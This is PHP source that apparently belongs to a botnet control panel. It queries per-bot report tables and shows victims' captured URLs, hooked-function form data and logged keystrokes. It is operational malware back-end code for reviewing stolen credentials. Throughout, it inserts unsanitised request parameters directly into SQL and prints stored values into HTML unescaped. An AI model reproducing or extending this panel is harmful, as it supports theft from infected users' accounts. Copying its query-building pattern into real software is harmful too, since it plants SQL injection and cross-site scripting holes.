<!--<script type="text/javascript">
    var GB_ROOT_DIR = "js/greybox/";
</script>

<script type="text/javascript" src="js/greybox/AJS.js"></script>
<script type="text/javascript" src="js/greybox/AJS_fx.js"></script>
<script type="text/javascript" src="js/greybox/gb_scripts.js"></script>
<link href="js/greybox/gb_styles.css" rel="stylesheet" type="text/css" />-->

<?php

set_time_limit(0);

$bot_guid = $_POST['bot_guid'];
$process_name = $_POST['process_name'];
$hooked_func = $_POST['hooked_func'];
$repdatestart = $_POST['repdatestart'];
$repdateend = $_POST['repdateend'];
$rep_url = $_POST['rep_url'];
$data = $_POST['data'];
$limit = $_POST['limit'];
$dt = $_GET['dt'];

$BotGUID_LIKE = $_POST['BotGUID_LIKE'];
$Data_show = $_POST['Data_show'];
$URL_show = $_POST['URL_show'];
$ReverseSearch = $_POST['ReverseSearch'];

if (strlen($bot_guid))
{
	if( $BotGUID_LIKE == true ) $sql_add_botguid = " AND rep2_$dt.bot_guid LIKE '%$bot_guid%'";
	else $sql_add_botguid = " AND rep2_$dt.bot_guid = '$bot_guid'";
}

if (strlen($process_name)) $sql_add_procname = " AND rep2_$dt.process_name LIKE '%$process_name%'";
if (strlen($hooked_func)) $sql_add_hfunc = " AND rep2_$dt.hooked_func LIKE '%$hooked_func%'";
if (strlen($rep_url))
{
	if ( strpos($rep_url, '*') !== false ) {
		$rep_url = str_replace( '*', '%', $rep_url );
	}
	$sql_add_repurl = " AND rep2_$dt.url LIKE '%$rep_url%'";
}

/* if (strlen($repdatestart) && strlen($repdateend)) {
	list($day, $month, $year) = split('[ :\/.-]', $repdatestart);
	$tstamp = gmmktime (0, 0, 0, $month, $day, $year);
	$repdatestart = gmdate('Y.m.d H:i:s', $tstamp);
	list($day, $month, $year) = split('[ :\/.-]', $repdateend);
	$tstamp = gmmktime (0, 0, 0, $month, $day, $year);
	$repdateend = gmdate('Y.m.d H:i:s', $tstamp);

	$sqlp4 = " AND ( rep2_$dt.date_rep >= '$repdatestart' AND rep2_$dt.date_rep <= '$repdateend')";
} */
if (strlen($data))
{
	if ( strpos($data, '*') !== false ) {
		$data = str_replace( '*', '%', $data );
	}
	if ($data{0} != '%')
		$data = '%' . $data;
	if ($data{ strlen($data) - 1 } != '%')
		$data .= '%';

	$sql_add_data = " AND rep2_$dt.func_data LIKE '$data'";
}
if (strlen($limit)) {
	$sql_add_LIMIT = " LIMIT $limit";
}


if( $ReverseSearch ) $sql_add_id_order = " ORDER BY `date_rep` DESC, `id` DESC";
else $sql_add_id_order = " ORDER BY `date_rep` ASC, `id` ASC";

$sql = 'SELECT `id`, `bot_guid`, `process_name`, `hooked_func`, `url` ';

if( $Data_show == true )
	$sql = $sql . ', `func_data`, `keys` ';
else	$sql = $sql . ', `id`, `id` ';	// It is for keep old code of query result row:
//while ( list($id, $bot_guid, $process_name, $hooked_func, $url, $func_data, $keys, $date_rep) = mysqli_fetch_row($res) ) {

$sql = $sql
. ', `date_rep` '
. "  FROM rep2_$dt"
. ' WHERE TRUE'
. $sql_add_botguid
. $sql_add_procname
. $sql_add_hfunc
// . $sqlp4
. $sql_add_repurl
. $sql_add_data
. $sql_add_id_order
. $sql_add_LIMIT
;
	 
?>

<?
require_once 'mod_file.php';
require_once 'mod_time.php';
require_once 'mod_dbase.php';
require_once 'mod_strenc.php';

$dbase = db_open();

$res = mysqli_query($dbase, $sql);
if (!(@($res))) {
	writelog("error.log", "Wrong query : \" $sql \"");
	db_close($dbase);
	exit;
}

if ( mysqli_num_rows($res) == 0) {
	echo "<b>Not found</b>";
	db_close($dbase);
	exit;
}

echo "<table width='730' border='1' cellspacing='0' cellpadding='2' style='border: 1px solid #BBBBBB; font-size: 9px; border-collapse: collapse; background-color: #4992a7;'>";

echo "<th style=' color: #EEEEEE;'>id</th>";
echo "<th style=' color: #EEEEEE;'>bot</th>";
echo "<th style=' color: #EEEEEE;'>bot_guid</th>";
echo "<th style=' color: #EEEEEE;'>date_rep</th>";
if( $URL_show == true && $Data_show == false )
{
	echo "<th style=' color: #EEEEEE;'>URL</th>";
}
else
{
	echo "<th style=' color: #EEEEEE;'>process_name</th>";
	echo "<th style=' color: #EEEEEE;'>hooked_func</th>";
}
while ( list($id, $bot_guid, $process_name, $hooked_func, $url, $func_data, $keys, $date_rep) = mysqli_fetch_row($res) ) {
	echo "<tr><td colspan='10'></td></tr>";
	
	echo "<tr align='center' valign='middle' style=' background-color: #cce7ef; '>";
	
	$ucodebot = urlencode($bot_guid);
	// onclick=\"GB_show('Detail info for selected bot', '../../frm_bot.php?guid=$ucodebot', 300, 600); return false;\"
	echo "<td><a href='frm_findrep_sub2.php?id=$id&dt=$dt' target='_blank'>$id</a></td>";
	
	
	echo "<td><a href='frm_bot.php?guid=$ucodebot' target='_blank'><img border='0' src='img/info.png'></a></td>";
	echo "<td>$bot_guid</td>";
	echo "<td>$date_rep</td>";
	if( $URL_show == true && $Data_show == false )
	{
		$arr = parse_url( $url );
		// colspan='enough for few next modifications'
		echo "<td colspan='10' align='left' style=' background-color: #F7F7FF; ' title='$url'><a href='frm_findrep_sub2.php?id=$id&dt=$dt' target='_blank'>{$arr['scheme']}://{$arr['host']}</a></td>"; 
	}
	else
	{
		echo "<td>$process_name</td>";
		echo "<td>$hooked_func</td>";
	
		if( $URL_show == true )
		{
			
			echo '</tr>';
			echo "<tr align='center' valign='middle' style=' background-color: #cce7ef; '>";
			echo "<td>URL:</td>";
			$arr = parse_url( $url );
			// colspan='enough for few next modifications'
			//echo "<td colspan='10' align='left' style=' background-color: #F7F7FF; ' title='$url'>$url</td>";
			echo "<td colspan='10' align='left' style=' background-color: #F7F7FF; ' title='$url'><a href='frm_findrep_sub2.php?id=$id&dt=$dt' target='_blank'>{$arr['scheme']}://{$arr['host']}</a></td>"; 
		}
		echo '</tr>';
	
		if( $Data_show == true )
		{
			$data = $func_data;

			// readable stuff
			$data = str_replace('&', "\n", $data);

			if (strlen($url) && substr($data, 0, 4) != 'http')
				$data = $url . "\n\n" .  $data;	

			// displaying keys too
			if (strlen($keys) != 0) {
				$keys = ucs2html($keys);
				$data = "$data\n\nkeys: $keys";
			}

		echo "<tr style=' background-color: #cce7ef; '>";

		echo "<td colspan='10'><textarea onmouseover='this.style.backgroundColor = \"white\"; this.style.height = this.scrollHeight + \"px\";' onmouseout='this.style.backgroundColor=\"#e7f2f6\"; this.style.height = \"100px\";' style=' border-width: 1px; width: 730px; height: 100px; background-color: #e7f2f6; color: #666666; ' readonly >$data</textarea></td>";

		echo '</tr>';
		}
	}
	echo '</tr>';
}
db_close($dbase);

echo "</table>";

?>
